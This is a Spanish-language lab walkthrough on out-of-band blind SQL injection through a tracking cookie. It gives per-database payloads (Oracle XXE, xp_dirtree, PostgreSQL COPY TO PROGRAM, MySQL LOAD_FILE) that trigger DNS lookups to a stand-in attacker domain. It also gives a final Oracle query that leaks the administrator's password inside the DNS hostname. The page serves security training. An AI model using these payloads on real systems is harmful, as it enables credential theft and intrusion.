---
layout: default
title: Ejercicio práctico
permalink: /injection_types/blind/oob_type/oob_exercise
nav_order: 1
parent: 4.4 Fuera de banda
grand_parent: 4. Inyecciones ciegas
---

# Ejercicio práctico de inyección fuera de banda

## Consigna
La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie presentada. La misma es vulnerable a Inyecciones SQL, sin embargo las consultas se ejecutan de forma asincrónica y no tienen ningún efecto en la respuesta de la aplicación. Por lo que, debemos probar extraer la información mediante otro canal.

Nuevamente nos mencionan que la base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`, y para resolver el laboratorio, es necesario  iniciar sesión como `administrator`.

## Resolución con Burp Collaborator

Para la resolución de este laboratorio se utilizara el servidor de burp collaborator el cual esta publicado a internet y puede funcionar como canal para recibir la información. Y nos apoyaremos en la [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) para la construcción de la consulta.

La premisa del laboratorio nos menciona que no es posible observar cambios de comportamiento sobre la aplicación, por lo que todas nuestras pruebas deben apoyarse directamente en nuestro servidor tercero. Para ello debemos  ir a la seccion `Collaborator` (Solo disponible para Burpsuite Professional).

![Collaborator](/test-page/assets/oob_ex_1.png)

Solo debemos presionar `Copy to clipboard` y automáticamente obtendremos un subdominio único el cual podremos usar como canal para visualizar las respuestas del servidor. 

Podemos probar los diferentes métodos mencionados en la cheat sheet para forzar una consulta DNS lookup e identificar el tipo de base de datos.

	ORACLE:
	La siguiente técnica aprovecha una vulnerabilidad de entidad externa XML ([XXE](https://portswigger.net/web-security/xxe)) para activar una búsqueda DNS. La vulnerabilidad ha sido parcheada, pero existen muchas instalaciones de Oracle sin parchear:  
	`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`  
  
	La siguiente técnica funciona en instalaciones Oracle totalmente parcheadas, pero requiere privilegios elevados:  
	`SELECT UTL_INADDR.get_host_address('dominio-atacante.net')`

	MICROSOFT:
	`exec master..xp_dirtree '//dominio-atacante.net'`

	PostgreSQL:
	`copy (SELECT '') to program 'nslookup dominio-atacante.net'`

	MySQL:
	Las siguientes técnicas sólo funcionan en Windows:  
	`LOAD_FILE('\\\\dominio-atacante.net\a')`  
	`SELECT ... INTO OUTFILE '\\\\dominio-atacante.net\a'`

Una consulta exitosa generaría una resolución DNS sobre el dominio utilizado, esto sería visualizado de la siguiente manera en la sección `Collaborator`

![Collaborator 2](/test-page/assets/oob_ex_2.png)

Bien, identificamos el tipo de base, sumado a los datos facilitados en la consigna, solo nos restaría construir la consulta mediante la cual vamos a extraer la información que requerimos, volvamos a la **sheat sheet**.
  
La siguiente técnica aprovecha una entidad externa XML ([XXE](https://portswigger.net/web-security/xxe)) para activar una búsqueda de DNS.

`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.dominio-atacante.net/"> %remote;]>'),'/l') FROM dual
`

Con nuestra consulta SQL quedaría de la siguiente forma:

`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.dominio-atacante.net/"> %remote;]>'),'/l') FROM dual`

Tal como está construida la consulta, lo que esperaríamos es una resolución DNS cuyo dominio consultado contendrá la respuesta de la consulta SQL continuado por el dominio atacante, algo similar a: `password.dominio-atacante.net`.

Observemos la respuesta en el `Collaborator`

![Collaborator 3](/test-page/assets/oob_ex_3.png)

[DNS Based Out of Band Blind SQL injection in Oracle — Dumping data](https://usamaazad.medium.com/dns-based-out-of-band-blind-sql-injection-in-oracle-dumping-data-45f506296945)
